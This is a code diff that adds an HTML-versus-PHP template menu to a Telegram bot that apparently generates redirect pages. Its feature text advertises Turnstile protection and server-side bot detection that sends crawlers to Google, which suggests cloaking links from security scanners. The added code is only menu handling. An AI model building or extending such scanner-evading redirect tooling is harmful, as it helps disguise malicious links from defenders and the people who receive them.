@@ -959,6 +959,7 @@ if (bot) {
               { text: 'Domain Tester 🚥', url: 'https://t.me/clstes_bot' }
             ],
             [
+              { text: '⚙️ Template Settings', callback_data: 'template_settings' },
               { text: '🔑 VIP Access Request', callback_data: 'admin_access' }
             ]
           ]
@@ -1667,6 +1668,63 @@ bot.on('callback_query', async (ctx) => {
         );
       }
 
+
+      // Handle template settings
+      if (callbackData === 'template_settings') {
+        const user = await getUserData(ctx.from.id);
+        const currentTemplate = user.templateType || 'html';
+        
+        return ctx.editMessageText(
+          `⚙️ *Template Settings*\n\n` +
+          `Current Template: *${currentTemplate.toUpperCase()}*\n\n` +
+          `📄 *HTML Template*\n` +
+          `• Works on any hosting\n` +
+          `• Client-side only\n` +
+          `• Cloudflare Turnstile protection\n\n` +
+          `🔐 *PHP Template*\n` +
+          `• Requires PHP hosting\n` +
+          `• Server-side bot detection\n` +
+          `• Redirects bots to Google before page loads\n` +
+          `• Includes all HTML features\n\n` +
+          `Choose your preferred template type:`,
+          { 
+            parse_mode: "Markdown",
+            reply_markup: {
+              inline_keyboard: [
+                [
+                  { text: currentTemplate === 'html' ? '✅ HTML' : '📄 HTML', callback_data: 'set_template_html' },
+                  { text: currentTemplate === 'php' ? '✅ PHP' : '🔐 PHP', callback_data: 'set_template_php' }
+                ],
+                [{ text: '🔙 Back to Menu', callback_data: 'back_menu' }]
+              ]
+            }
+          }
+        );
+      }
+
+      // Handle template type selection
+      if (callbackData === 'set_template_html' || callbackData === 'set_template_php') {
+        const user = await getUserData(ctx.from.id);
+        const newTemplate = callbackData === 'set_template_html' ? 'html' : 'php';
+        
+        user.templateType = newTemplate;
+        await saveUserData(ctx.from.id, user);
+        
+        return ctx.editMessageText(
+          `✅ *Template Updated!*\n\n` +
+          `Your template has been set to: *${newTemplate.toUpperCase()}*\n\n` +
+          `All new redirects will use the ${newTemplate.toUpperCase()} template.`,
+          { 
+            parse_mode: "Markdown",
+            reply_markup: {
+              inline_keyboard: [
+                [{ text: '⚙️ Change Template', callback_data: 'template_settings' }],
+                [{ text: '🔙 Back to Menu', callback_data: 'back_menu' }]
+              ]
+            }
+          }
+        );
+      }
 
       // Handle admin access request
       if (callbackData === 'admin_access') {
